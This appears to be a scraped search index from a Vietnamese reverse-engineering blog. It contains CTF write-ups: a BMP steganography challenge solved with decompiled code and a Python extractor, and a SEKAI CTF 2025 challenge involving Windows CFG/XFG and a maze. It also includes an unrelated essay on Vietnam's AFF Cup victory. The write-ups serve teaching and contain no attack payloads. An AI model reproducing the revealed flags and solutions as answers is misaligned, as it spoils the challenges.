từng case một. data = [0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x74, 0xCC, 0xCC, 0xCC, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0xCC, 0xCC, 0xCC, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x3B, 0xCC, 0xCC, 0xCC, 0x02, 0x00, 0x00, 0x00, 0x88, 0x00, 0x00, 0x00, 0x81, 0x24, 0xCC, 0xCC, 0x03, 0x00, 0x00, 0x00, 0x6F, 0x00, 0x00, 0x00, 0x63, 0x33, 0x59, 0x6F, 0x02, 0x00, 0x00, 0x00, 0x84, 0x00, 0x00, 0x00, 0x01, 0x01, 0xCC, 0xCC, 0x02, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x35, 0xAF, 0xCC, 0xCC, 0x01, 0x00, 0x00, 0x00, 0xD0, 0x00, 0x00, 0x00, 0x33, 0xCC, 0xCC, 0xCC, 0x03, 0x00, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x64, 0x4D, 0x78, 0x76, 0x04, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0xDD, 0x20, 0xB1, 0x1A, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x00, 0x00, 0x0C, 0xCC, 0xCC, 0xCC, 0x03, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x6A, 0x44, 0x42, 0x35, 0x02, 0x00, 0x00, 0x00, 0x1D, 0x00, 0x00, 0x00, 0xA6, 0x21, 0xCC, 0xCC, 0x02, 0x00, 0x00, 0x00, 0x1F, 0x00, 0x00, 0x00, 0xBE, 0x8A, 0xCC, 0xCC, 0x01, 0x00, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x4C, 0xCC, 0xCC, 0xCC, 0x02, 0x00, 0x00, 0x00, 0x22, 0x00, 0x00, 0x00, 0x26, 0x0E, 0xCC, 0xCC, 0x01, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x35, 0xCC, 0xCC, 0xCC, 0x01, 0x00, 0x00, 0x00, 0x5D, 0x00, 0x00, 0x00, 0x3B, 0xCC, 0xCC, 0xCC, 0x03, 0x00, 0x00, 0x00, 0x2B, 0x00, 0x00, 0x00, 0x6A, 0x45, 0x39, 0x75, 0x04, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x88, 0x3F, 0xED, 0x0D, 0x03, 0x00, 0x00, 0x00, 0xEB, 0x00, 0x00, 0x00, 0x6A, 0x33, 0x56, 0x7A, 0x02, 0x00, 0x00, 0x00, 0x32, 0x00, 0x00, 0x00, 0x35, 0xAF, 0xCC, 0xCC, 0x02, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0xAB, 0x2F, 0xCC, 0xCC, 0x02, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x81, 0x36, 0xCC, 0xCC, 0x03, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x6A, 0x6C, 0x63, 0x75, 0x01, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x02, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x25, 0x3C, 0xCC, 0xCC, 0x03, 0x00, 0x00, 0x00, 0x53, 0x00, 0x00, 0x00, 0x49, 0x46, 0x52, 0x67, 0x01, 0x00, 0x00, 0x00, 0x3E, 0x00, 0x00, 0x00, 0x21, 0xCC, 0xCC, 0xCC, 0x01, 0x00, 0x00, 0x00, 0x3F, 0x00, 0x00, 0x00, 0x54, 0xCC, 0xCC, 0xCC, 0x01, 0x00, 0x00, 0x00, 0x92, 0x00, 0x00, 0x00, 0x37, 0xCC, 0xCC, 0xCC, 0x01, 0x00, 0x00, 0x00, 0x86, 0x00, 0x00, 0x00, 0x74, 0xCC, 0xCC, 0xCC, 0x04, 0x00, 0x00, 0x00, 0x09, 0x01, 0x00, 0x00, 0xC0, 0x36, 0xFD, 0x13, 0x01, 0x00, 0x00, 0x00, 0x4A, 0x00, 0x00, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x01, 0x00, 0x00, 0x00, 0x0D, 0x01, 0x00, 0x00, 0x52, 0xCC, 0xCC, 0xCC, 0x04, 0x00, 0x00, 0x00, 0x4D, 0x00, 0x00, 0x00, 0xC1, 0x3D, 0xBA, 0x43, 0x03, 0x00, 0x00, 0x00, 0x1C, 0x01, 0x00, 0x00, 0x64, 0x32, 0x77, 0x6F, 0x04, 0x00, 0x00, 0x00, 0x3A, 0x00, 0x00, 0x00, 0xCD, 0x73, 0xB0, 0x0C, 0x04, 0x00, 0x00, 0x00, 0x56, 0x00, 0x00, 0x00, 0xCD, 0x73, 0xB9, 0x06, 0x03, 0x00, 0x00, 0x00, 0x5A, 0x00, 0x00, 0x00, 0x51, 0x32, 0x6D, 0x79, 0x04, 0x00, 0x00, 0x00, 0x0F, 0x01, 0x00, 0x00, 0xCB, 0x36, 0xAE, 0x10, 0x01, 0x00, 0x00, 0x00, 0x5E, 0x00, 0x00, 0x00, 0x3D, 0xCC, 0xCC, 0xCC, 0x02, 0x00, 0x00, 0x00, 0x5F, 0x00, 0x00, 0x00, 0x01, 0x21, 0xCC, 0xCC, 0x04, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x88, 0x27, 0xB5, 0x06, 0x01, 0x00, 0x00, 0x00, 0xBA, 0x00, 0x00, 0x00, 0x44, 0xCC, 0xCC, 0xCC, 0x04, 0x00, 0x00, 0x00, 0x9A, 0x00, 0x00, 0x00, 0xDC, 0x3A, 0xBA, 0x06, 0x03, 0x00, 0x00, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x49, 0x46, 0x4A, 0x6D, 0x04, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x88, 0x62, 0xAE, 0x43, 0x04, 0x00, 0x00, 0x00, 0x72, 0x00, 0x00, 0x00, 0xC1, 0x20, 0xFD, 0x0E, 0x02, 0x00, 0x00, 0x00, 0xC7, 0x00, 0x00, 0x00, 0x3D, 0x86, 0xCC, 0xCC, 0x01, 0x00, 0x00, 0x00, 0x7A, 0x00, 0x00, 0x00, 0x2B, 0xCC, 0xCC, 0xCC, 0x04, 0x00, 0x00, 0x00, 0x7B, 0x00, 0x00, 0x00, 0x88, 0x27, 0xB8, 0x0D, 0x01, 0x00, 0x00, 0x00, 0xC6, 0x00, 0x00, 0x00, 0x0E, 0xCC, 0xCC, 0xCC, 0x01, 0x00, 0x00, 0x00, 0x","date":"2025-10-01","objectID":"/2025-vcs/:1:3","tags":["Reverse-Engineering"],"title":"VCS Training RE","uri":"/2025-vcs/"},{"categories":null,"content":"week 1/HiddenTreasure Challenge Information Given files: HiddenTreasure.zip ","date":"2025-10-01","objectID":"/2025-vcs/:2:0","tags":["Reverse-Engineering"],"title":"VCS Training RE","uri":"/2025-vcs/"},{"categories":null,"content":"0x01 Overview Đề bài cung cấp một file PE32 HiddenTreasure.exe viết bằng C++ và một bitmap inside-the-mind-of-a-hacker-memory.bmp. Chạy chương trình có kèm theo các tham số nhưng đều không hiện output. Microsoft Windows [Version 10.0.26100.6584] (c) Microsoft Corporation. All rights reserved. C:\\Users\\PWN2OWN\u003eHiddenTreasure.exe C:\\Users\\PWN2OWN\u003eHiddenTreasure.exe aaaaaaaaaaaa ","date":"2025-10-01","objectID":"/2025-vcs/:2:1","tags":["Reverse-Engineering"],"title":"VCS Training RE","uri":"/2025-vcs/"},{"categories":null,"content":"0x02 Static Analysis Hàm main sau khi đã được phân tích và rename lại có nội dung như sau int __cdecl main(int argc, const char **argv, const char **envp) { unsigned int input_length; // kr00_4 HANDLE FileW; // eax void *v5; // ebx HANDLE FileMappingW; // eax void *v8; // esi _BYTE *bit_stream_buffer; // ebx unsigned int idx_input; // eax unsigned int idx_buffer; // esi char current_char; // cl const void *v13; // edi DWORD offset_pixel_data; // edx unsigned int idx_bit_stream; // ebx int image_width; // ecx char *pixel_data_ptr; // eax int y_coord; // edx int offset_pixel_row; // eax int x_coord; // edi int idx_pixel_in_row; // edx char v22; // al HANDLE v23; // [esp+4h] [ebp-128h] HANDLE hObject; // [esp+8h] [ebp-124h] int copy_image_width; // [esp+Ch] [ebp-120h] char *copy_pixel_data_ptr; // [esp+10h] [ebp-11Ch] int image_height; // [esp+14h] [ebp-118h] char *mapped_file_content; // [esp+18h] [ebp-114h] _BYTE *copy_bit_stream_buffer; // [esp+1Ch] [ebp-110h] DWORD bmp_file_sz; // [esp+20h] [ebp-10Ch] int v31; // [esp+20h] [ebp-10Ch] unsigned int v32; // [esp+24h] [ebp-108h] int v33; // [esp+24h] [ebp-108h] char input[256]; // [esp+28h] [ebp-104h] BYREF if ( argc == 3 ) { memset(input, 0, sizeof(input)); wcstombs(input, (const wchar_t *)argv[2], 0x100u); input_length = strlen(input); if ( input_length ) { FileW = CreateFileW((LPCWSTR)argv[1], 0xC0000000, 1u, 0, 3u, 0x80u, 0); v5 = FileW; v23 = FileW; if ( FileW != (HANDLE)-1 ) { bmp_file_sz = GetFileSize(FileW, 0); if ( bmp_file_sz == -1 || (FileMappingW = CreateFileMappingW(v5, 0, 4u, 0, 0, 0), v8 = FileMappingW, (hObject = FileMappingW) == 0) ) { CloseHandle(v5); return 0; } mapped_file_content = (char *)MapViewOfFile(FileMappingW, 6u, 0, 0, 0); if ( mapped_file_content ) { bit_stream_buffer = malloc(8 * input_length); idx_input = 0; copy_bit_stream_buffer = bit_stream_buffer; idx_buffer = 0; v32 = 0; do { current_char = input[idx_input]; bit_stream_buffer[idx_buffer] = current_char \u0026 1; bit_stream_buffer[idx_buffer + 1] = (current_char \u003e\u003e 1) \u0026 1; bit_stream_buffer[idx_buffer + 2] = (current_char \u003e\u003e 2) \u0026 1; bit_stream_buffer[idx_buffer + 3] = (current_char \u003e\u003e 3) \u0026 1; bit_stream_buffer[idx_buffer + 4] = (current_char \u003e\u003e 4) \u0026 1; bit_stream_buffer[idx_buffer + 5] = (current_char \u003e\u003e 5) \u0026 1; bit_stream_buffer[idx_buffer + 6] = (current_char \u003e\u003e 6) \u0026 1; idx_input = v32 + 1; bit_stream_buffer[idx_buffer + 7] = (current_char \u003e\u003e 7) \u0026 1; idx_buffer += 8; v32 = idx_input; } while ( idx_input \u003c input_length ); v13 = mapped_file_content; if ( *(_WORD *)mapped_file_content == 'MB' \u0026\u0026 bmp_file_sz \u003e= *(_DWORD *)(mapped_file_content + 2) ) { offset_pixel_data = *(_DWORD *)(mapped_file_content + 10); if ( offset_pixel_data \u003c bmp_file_sz \u0026\u0026 idx_buffer \u003c *(_DWORD *)(mapped_file_content + 34) ) { idx_bit_stream = 0; image_width = *(_DWORD *)(mapped_file_content + 18); image_height = *(_DWORD *)(mapped_file_content + 22); pixel_data_ptr = \u0026mapped_file_content[offset_pixel_data]; y_coord = 0; copy_image_width = image_width; copy_pixel_data_ptr = pixel_data_ptr; *((_WORD *)mapped_file_content + 3) = idx_buffer; v33 = 0; if ( idx_buffer ) { offset_pixel_row = 0; v31 = 0; do { if ( y_coord \u003e= image_height ) break; x_coord = 0; if ( idx_bit_stream \u003c idx_buffer ) { do { if ( x_coord \u003e= image_width ) break; idx_pixel_in_row = offset_pixel_row + x_coord++; v22 = copy_bit_stream_buffer[idx_bit_stream++]; copy_pixel_data_ptr[2 * idx_pixel_in_row + idx_pixel_in_row] = v22; offset_pixel_row = v31; image_width = copy_image_width; } while ( idx_bit_stream \u003c idx_buffer ); y_coord = v33; } ++y_coord; offset_pixel_row += 3 * image_width; v33 = y_coord; v31 = offset_pixel_row; } while ( idx_bit_stream \u003c idx_buffer ); v13 = mapped_file_content; } bit_stream_buffer = copy_bit_stream_buffer; } } free(bit_stream_buffer); UnmapViewOfFile(v13); CloseHandle(hObject); CloseHandle(v23); } else { CloseHandle(v8); CloseHandle(v5); } } } } return 0; } Tóm tắt luồng hoạt động: 1. Nhận Input: Chương trình yêu cầu 2 tham số dòng","date":"2025-10-01","objectID":"/2025-vcs/:2:2","tags":["Reverse-Engineering"],"title":"VCS Training RE","uri":"/2025-vcs/"},{"categories":null,"content":"0x03 Analyzing file BMP Các giá trị thu được là: Size bit_stream_buffer = 0xF0 → input_length = 0xF0 / 8 = 30. offset_pixel_data = 0x36. Data: mapped_file_content[0x36 : (0x36 + 0xF0 * 3)]. ","date":"2025-10-01","objectID":"/2025-vcs/:2:3","tags":["Reverse-Engineering"],"title":"VCS Training RE","uri":"/2025-vcs/"},{"categories":null,"content":"0x04 Final script import struct with open(\"./inside-the-mind-of-a-hacker-memory.bmp\", 'rb') as f: f.seek(6) num_bits_bytes = f.read(2) num_bits_to_read = struct.unpack('\u003cH', num_bits_bytes)[0] f.seek(10) offset_bytes = f.read(4) pixel_data_offset = struct.unpack('\u003cI', offset_bytes)[0] f.seek(pixel_data_offset) extracted_bits = [] for i in range(num_bits_to_read): blue_channel_byte = f.read(1) extracted_bits.append(blue_channel_byte[0]) f.seek(2, 1) decoded_chars = [] for i in range(0, len(extracted_bits), 8): byte_chunk = extracted_bits[i:i+8] byte_value = 0 for bit_index, bit in enumerate(byte_chunk): byte_value += bit * (2**bit_index) decoded_chars.append(chr(byte_value)) print(f\"[*] FLAG: {''.join(decoded_chars)}\") FLAG: flag{dont_forget_the_treasure} ","date":"2025-10-01","objectID":"/2025-vcs/:2:4","tags":["Reverse-Engineering"],"title":"VCS Training RE","uri":"/2025-vcs/"},{"categories":null,"content":"Solutions for some challenges in SEKAI CTF 2025 by ducdatdau","date":"2025-09-07","objectID":"/2025-sekai/","tags":["Reverse-Engineering","SEKAI","2025"],"title":"SEKAI CTF 2025","uri":"/2025-sekai/"},{"categories":null,"content":"\rimg {\rbox-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;\rborder-radius: 6px;\rdisplay: block; margin: 0 auto 15px;\r}\r\r","date":"2025-09-07","objectID":"/2025-sekai/:0:0","tags":["Reverse-Engineering","SEKAI","2025"],"title":"SEKAI CTF 2025","uri":"/2025-sekai/"},{"categories":null,"content":"rev/Miku Music Machine (Hard) Challenge Information Description: I’ve created the Miku Music Machine (MMM for short)! Just give it an input, and it will use coding and algorithms™ to generate a beautiful personalized tune based on your prompt. Can you compose a song that pleases Miku? Note: This challenge does not work on Wine. Note: The original version of this challenge (miku-music-machine.exe) relies on a specific Windows feature that was removed in most recent Windows versions. Running on these versions results in invalid flags being accepted by the binary. To avoid this issue, we’ve attached mmm-v2.exe which will work on all Windows versions. The flag is identical for both versions. Author: molenzwiebel Given files: miku-music-machine.exe, mmm-v2.exe ","date":"2025-09-07","objectID":"/2025-sekai/:1:0","tags":["Reverse-Engineering","SEKAI","2025"],"title":"SEKAI CTF 2025","uri":"/2025-sekai/"},{"categories":null,"content":"0x01 Overview Đề bài cho một file PE64, thử chạy với các input ngẫu nhiên, chương trình sẽ yêu cầu một input với độ dài hợp lệ. C:\\Users\\P\\Downloads\u003emmm-v2.exe Usage: mmm-v2.exe \u003cprompt\u003e C:\\Users\\P\\Downloads\u003emmm-v2.exe SEKAI{aaaaaaa} You should work on the length of your prompt! Chương trình thực hiện một số bước để kiểm tra tính chính xác của input: Kiểm tra độ dài input = 50. Mở MIDI (Musical Instrument Digital Interface). Xor từng ký tự với mảng xor_values cho trước, đồng thời tăng giá trị của biến equal_418 lên. Tạo MIDI message dựa trên giá trị equal_418 và gửi tới MIDI. Kiểm tra equal_418 = 418 hay không. Nếu đúng sẽ in ra That was beautiful!. Sau một hồi quan sát, thứ làm mình chú ý tới nhất đó là list_fn[v8]();. Đây là một danh sách chứa các địa chỉ hàm khác nhau. ","date":"2025-09-07","objectID":"/2025-sekai/:1:1","tags":["Reverse-Engineering","SEKAI","2025"],"title":"SEKAI CTF 2025","uri":"/2025-sekai/"},{"categories":null,"content":"0x02 CFG/XFG Đặt breakpoint ngay tại dòng list_fn[v8](); với input SEKAI{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}. Sau khi F9 để chương trình chạy liên tục, IDA đưa ra một thông báo lỗi 7FFE06586490: unknown exception code C0000409 (exc.code c0000409, tid 19460) Để biết chính xác tại sao bị lỗi này, mình đã chuyển qua code assembly ngay đoạn đặt breakpoint để tìm hiểu. Chương trình có call một hàm khá lạ __guard_xfg_dispatch_icall_fptr. Sau khi tìm kiếm trên Google, mình có đọc được một bài viết khá chi tiết nói về hàm này: https://connormcgarr.github.io/examining-xfg Định nghĩa về CFG và XFG theo như mình tìm hiểu được như sau. Cả 2 đều có chức năng chống lại việc ghi đè function pointer trong Windows. CFG hay còn được biết tới là Control Flow Guard. Khi một function pointer được gọi, cơ chế này sẽ kiểm tra xem địa chỉ được trỏ tới đã đăng ký ở trong bitmap hay chưa, nếu chưa sẽ ngăn chặn việc gọi hàm. Kỹ thuật này ngăn chặn được kỹ thuật ROP-chain nhưng vẫn không thể tránh được việc attacker ghi đè function pointer thành địa chỉ các hàm hệ thống nguy hiểm như: VirtualProtect(), WriteProcessMemory(), … XFG hay Xtended Flow Guard là phiên bản nâng cấp của CFG. Ngoài việc kiểm tra địa chỉ đã được đăng ký trong bitmap hay chưa, cơ chế này còn kiểm tra mã hash của một số thuộc tính như: số lượng parameter, kiểu dữ liệu của parmeter, kiểu dữ liệu trả về, … Từ đó kẻ tấn công ngoài việc ghi đè function pointer còn phải thiết kế hàm sao cho trùng khớp với các thuộc tính đã nêu trên. Quay lại bài toán, ta thấy được tác giả đã sử dụng cơ chế bảo vệ XFG với 85F13E9656DA4870h là mã hash để check. Câu hỏi được đặt ra là: Tại sao chương trình thông báo lỗi khi gặp XFG? Do hàm được gọi chưa được đăng ký trong bitmap? Do các thuộc tính của hàm gọi không trùng khớp với mã hash và gây crash? Checking the bitmap Ở bài viết nêu trên, tác giả sử dụng công cụ dumpbin.exe để extract ra bitmap. Kết quả thu được khá lớn, mình chỉ tập trung ở phần Guard CF Function Table, trong đó địa chỉ nào có dấu X là được bảo vệ bởi cơ chế XFG. C:\\Users\\P\\Downloads\\dumpbin-14.40.33811-x64\u003edumpbin.exe /LOADCONFIG mmm-v2.exe Guard CF Function Table Address -------- X 0000000140001010 X 0000000140001050 X 0000000140001070 [...] X 0000000140004650 X 00000001400046D0 X 00000001400046F0 00000001400049C0 0000000140004C40 0000000140004D00 [...] 0000000140014060 0000000140015080 X 0000000140015420 X 0000000140015560 [...] X 000000014005C840 X 000000014005D270 X 000000014005D310 000000014005E440 000000014005E5F0 Nhìn vào danh sách các địa chỉ các hàm của list_fn trong IDA. chúng ta có thể xác định được nhiệm vụ trước mắt phải làm: Rebase địa chỉ chương trình sao cho trùng khớp giữa IDA và bitmap. Kiểm tra các hàm nào đã được đăng ký cả trong IDA lẫn bitmap. Nhìn ở bitmap, mình lấy base_address = 0x140000000 bởi vì: min_address = 0x140001010, max_address = 0x14005E5F0 dẫn tới giá trị sẽ là 0x140000000 + offset. Nhiệm vụ tiếp theo là xác định hàm nào trong list_fn đã được đăng ký bitmap. Mình viết một đoạn python script nhỏ để in các hàm đấy và index của nó. ida_list_fn = [0x1400025F0, 0x140001EF0, ..., 0x140003310, 0x140004110] available_fn = [0x140001010, 0x140001070, ..., 0x14005D270, 0x14005D310] available_idx = [] for i in range(len(ida_list_fn)): if ida_list_fn[i] in available_fn: available_idx.append(i) print(available_idx) # [22, 24, ..., 416, 418] Checking signature Sau khi xem qua các hàm trong available_fn, mình nhận ra có một số hàm hơi khác lạ. Ví dụ như hàm sub_430() có xuất hiện lệnh xor 0x7D với giá trị ở địa chỉ loc_79E thuộc hàm sub_790(). Hàm sub_790() là một hàm trong available_fn và có gọi tới RtlFailFast(). Kết luận: Khi hàm sub_430() được gọi thì hàm sub_790() sẽ được unlock. Dựa vào keyword 0x7D, mình tìm thêm được 5 hàm nữa có chức năng tương tự. Script để tìm index của các hàm như trên, đồng thời xóa đi các index của unlocked function trong available_idx. map_fn = { 0x140001570 : 0x1400014F0, 0x140002970 : 0x1400023D0, 0x140003650 : 0x140001410, ","date":"2025-09-07","objectID":"/2025-sekai/:1:2","tags":["Reverse-Engineering","SEKAI","2025"],"title":"SEKAI CTF 2025","uri":"/2025-sekai/"},{"categories":null,"content":"0x03 Solving the maze Kết hợp 2 dữ kiện ở trên, ta liên tưởng ngay đến bài toán maze cổ điển với quy tắc như sau: Mỗi ký tự trong input sẽ được chia làm 4 phần, mỗi phần 2 bits tương ứng với di chuyển: lên, xuống, trái, phải. Vị trí đi tới luôn bị thay đổi và phải đảm bảo nằm trong available_idx. Có 6 vị trí khi tới đấy sẽ unlock được một vị trí khác. Tới đây có thể dùng thuật toán DFS để tìm ra các bước đi và tạo GIF để nhìn thấy rõ toàn bộ quá trình của nó như sau ida_list_fn = [0x1400025F0, 0x140001EF0, 0x1400039B0, 0x140004090, 0x140002F70, 0x140003B70, 0x140002590, 0x140001210, 0x140002E70, 0x140004370, 0x140001E70, 0x140003A50, 0x140003D70, 0x1400033F0, 0x140002B50, 0x140003070, 0x140004250, 0x140003230, 0x1400013D0, 0x140002E30, 0x140002B10, 0x140001D50, 0x140001ED0, 0x140002190, 0x140001370, 0x1400016B0, 0x140004430, 0x140001770, 0x140004230, 0x140002530, 0x140002290, 0x140001710, 0x1400010B0, 0x1400015B0, 0x1400037D0, 0x140003290, 0x1400041B0, 0x140004270, 0x140001F70, 0x140003F70, 0x140003B10, 0x1400023B0, 0x1400034D0, 0x140003610, 0x1400018D0, 0x140004490, 0x140004450, 0x140003E70, 0x140003A70, 0x140001CD0, 0x140002D30, 0x1400020B0, 0x140003570, 0x140002DB0, 0x1400045F0, 0x140002EF0, 0x140003770, 0x140001910, 0x140002DD0, 0x1400029D0, 0x140002AD0, 0x140001F50, 0x140001A30, 0x140003D30, 0x140001DB0, 0x140003AD0, 0x140001B30, 0x1400017D0, 0x140002450, 0x140003FD0, 0x140002390, 0x140002350, 0x140001790, 0x1400013B0, 0x140003CD0, 0x140003030, 0x140002110, 0x140002770, 0x1400016D0, 0x1400019B0, 0x140003E10, 0x140001A90, 0x140003CF0, 0x1400017B0, 0x140002BB0, 0x140001F10, 0x140001890, 0x1400045D0, 0x140003C30, 0x1400011D0, 0x140001BD0, 0x140004510, 0x140001650, 0x140002150, 0x140003B50, 0x1400040D0, 0x140002830, 0x140004650, 0x1400012B0, 0x140003AB0, 0x140002C30, 0x1400019D0, 0x140003BB0, 0x140002B90, 0x140002370, 0x140003930, 0x140003810, 0x1400042F0, 0x140002F50, 0x140003250, 0x1400015F0, 0x140002630, 0x1400024D0, 0x140001830, 0x140003BD0, 0x1400046F0, 0x140002AF0, 0x140001C70, 0x140003710, 0x140002C70, 0x1400042D0, 0x140004010, 0x1400019F0, 0x140003050, 0x140002410, 0x140001DD0, 0x1400046B0, 0x140002230, 0x140004710, 0x140003DF0, 0x140001450, 0x140004070, 0x140003730, 0x140001090, 0x140003ED0, 0x140002670, 0x140003DB0, 0x1400016F0, 0x140003350, 0x1400034B0, 0x140004570, 0x140002CF0, 0x140003870, 0x140001B10, 0x1400032B0, 0x140002F30, 0x140001310, 0x140003D10, 0x140003850, 0x140003430, 0x140001430, 0x140001010, 0x1400042B0, 0x140003650, 0x140002850, 0x1400022F0, 0x140002710, 0x140003F10, 0x1400014D0, 0x140004590, 0x140003E90, 0x140001810, 0x140003E50, 0x140003EB0, 0x140001AF0, 0x140002270, 0x140002430, 0x140004130, 0x140003E30, 0x1400039D0, 0x140001970, 0x140001870, 0x140001290, 0x140002130, 0x1400035F0, 0x140003C90, 0x140002BD0, 0x140003550, 0x1400033D0, 0x140001FF0, 0x140002A30, 0x140002330, 0x1400010D0, 0x140001190, 0x140001530, 0x1400015D0, 0x140002810, 0x140001570, 0x1400043B0, 0x140002B30, 0x140002F10, 0x140001670, 0x140001CB0, 0x140002930, 0x1400040B0, 0x1400045B0, 0x140001730, 0x140002210, 0x1400017F0, 0x1400032F0, 0x1400046D0, 0x140001390, 0x1400039F0, 0x140002550, 0x140003590, 0x1400035D0, 0x1400026D0, 0x1400022B0, 0x140001FD0, 0x140003CB0, 0x140003A10, 0x1400041F0, 0x1400033B0, 0x140003A30, 0x140002910, 0x1400024B0, 0x140003A90, 0x1400021B0, 0x1400024F0, 0x1400041D0, 0x140004330, 0x1400034F0, 0x1400038D0, 0x140001630, 0x140001590, 0x140002DF0, 0x140003530, 0x140002C90, 0x140001F30, 0x140002A10, 0x1400023F0, 0x1400044D0, 0x140002AB0, 0x140003130, 0x140003DD0, 0x140004210, 0x140001510, 0x1400011B0, 0x140002030, 0x1400030B0, 0x140003470, 0x140002ED0, 0x1400040F0, 0x140003910, 0x1400011F0, 0x140002170, 0x1400012D0, 0x140002FF0, 0x140003C70, 0x140002090, 0x140003FF0, 0x1400018B0, 0x140002CB0, 0x140002C50, 0x140001550, 0x140003B90, 0x1400043F0, 0x140001D10, 0x140001D90, 0x140004170, 0x140003690, 0x140003510, 0x140003890, 0x140002A50, 0x140003370, 0x1400012F0, 0x1400037B0, 0x1400013F0, 0x140001C90, 0x1400028F0, 0x14","date":"2025-09-07","objectID":"/2025-sekai/:1:3","tags":["Reverse-Engineering","SEKAI","2025"],"title":"SEKAI CTF 2025","uri":"/2025-sekai/"},{"categories":null,"content":" img { box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px; border-radius: 6px; display: block; margin-left: auto; margin-right: auto; } Vào những ngày đầu xuân năm mới 2025 dương lịch, mình và toàn thể nhân dân đất nước Việt Nam đã được sống và hòa mình trong những giây phút hạnh phúc nhất của cuộc đời. Sau 6 năm chờ đợi, cuối cùng Việt Nam cũng đã nâng cao chiếc cúp AFF, tất cả người dân cả người đã có một đêm không ngủ để cùng nhau ra đường, vô vang khẩu hiệu “Việt Nam Vô Địch”. Hình ảnh người dân cả nước đi bão\" Hình ảnh người dân cả nước đi bão -- Chiếc cúp vàng đã về Việt Nam -- Mình xem bóng đá lần đầu tiên là khoảng năm 2011, lúc đó giải V.League đang rất nóng, đặc biệt là những trận cầu của SLNA với một vài đối thủ như Hải Phòng, Hà Nội T\u0026T, Thanh Hóa. Mình thường xem bóng cùng với bố hoặc bác trai vào những buổi chiều đi học về, dần dần tình yêu dành cho trái bóng ngày càng lớn. Tình cảm dành cho bóng đá đã nuôi dưỡng cho tâm hồn mình, cho mình những kỉ niệm vô cùng đẹp thời thơ ấu. Và cũng kể từ đó, đây là lần đầu tiên mình được thấy Đội tuyển Quốc gia Việt Nam đánh bại Thái Lan cả lượt đi lẫn lượt về. Tỷ số chung cuộc 5-3\" Tỷ số chung cuộc 5-3 -- Chiến thắng của Việt Nam ở giải đấu năm nay mang dấu ấn rất lớn của tiền đạo nhập tịch người Brazil Nguyễn Xuân Son. Chiến binh Nguyễn Xuân Son -- Thật đáng tiếc khi anh đã dính chấn thương đứt dây chằng trong trận chung kết. Việt Nam đã mất đi một trụ cột rất quan trọng trong đội hình nhưng đó cũng là lời minh chứng cho sức mạnh đội tuyển khi không có sự xuất hiện của Xuân Son trên sân. Quay về khoảng chục năm đổ lại, nếu không có drama của Phan Văn Santos và Việt Nam cởi mở hơn với việc gọi cầu thủ nhập tịch lên tuyển thì mình nghĩ Việt Nam sẽ có rất nhiều chiến thắng quan trọng trong quá khứ chứ không phải đợi tới bây giờ. Những cầu thủ Đinh Hoàng Max, Nguyễn Van Bakel, Hoàng Vũ Samson đủ chất lượng để có thể tạo nên được sự khác biệt. Theo quan điểm cá nhân của mình, ý kiến “Người Việt Nam có một tình yêu bóng đá mãnh liệt” là chưa thực sự đúng đắn. Dẫn chứng có thể dễ dàng nhìn thấy đó là số lượng khán giả tham gia những trận đấu ở VLeague chỉ ở mức trung bình hay ở vòng loại thứ 3 World Cup, Việt Nam phải đụng độ với các ông kẹ bóng đá châu Á và thường xuyên phải nhận thất bại. Người hâm mộ đã tỏ ra chán nản và nhiều người đã quay lưng lại với đội tuyển chúng ta. Từ đó mới thấy được rằng, quan điểm của thầy Park Hang Seo về bóng đá Việt Nam là có phần hợp lý và sâu sắc: “Người Việt Nam chỉ yêu thích bóng đá chiến thắng mà thôi”. -- Nhìn sang đối thủ đáng gờm của chúng ta - Thái Lan, ta sẽ thấy họ đã bài bản như thế nào trong công việc đào tạo trẻ, phát triển giải quốc nội Thái League. Mình có xem một vài video về câu lạc bộ Buriram United, thực sự mà nói, chúng ta đang thua kém họ khá nhiều về cả việc đào tạo, đầu tư sân bãi, … Mình hy vọng rằng, chính phủ Việt Nam, các đại gia trong và ngoài nước hãy rót thêm tiền vào việc đào tạo trẻ, nâng cấp sân bãi để Việt Nam có thể sản sinh ra được nhiều tầng lớp tài năng kế cận. Việc thưởng tiền, thưởng nhà lầu, ô tô cho các cầu thủ lập thành tích tốt không có gì là sai phạm, nhưng thử nghĩ lại khi những cầu thủ đã đầy đủ của cải, vật chất, nếu như không có một tinh thần thép “vượt sướng” thì thử hỏi những chiến binh có còn động lực để thi đấu nữa không. Nhìn về lò đào tạo trẻ SLNA, ở Nghệ An không thiếu những tài năng trẻ, minh chứng có thể thấy khi họ áp đảo các giải trẻ như U11, U13, U17, … nhưng càng lên cao thì phong độ càng thụt lùi. Mình nghĩ đơn giản vì Nghệ An nghèo, họ thiếu ăn, thiếu mặc nên ý chí và quyết tâm rất lớn. Nhưng đến khi đã có một chân trên tuyển, đã có được tiền và chút danh tiếng thì ý chí đó lại bị phai mờ dần dẫn tới sự sa sút trong sự nghiệp. Trích một đoạn bình luận của thầy Nguyễn Hữu Việt Hưng: “Ai cũng biết doanh nghiệp đổ tiền vào bóng đá, nói cho cùng, cũng là để đánh bóng tên tuổi doanh nghiệp. Nhưng làm 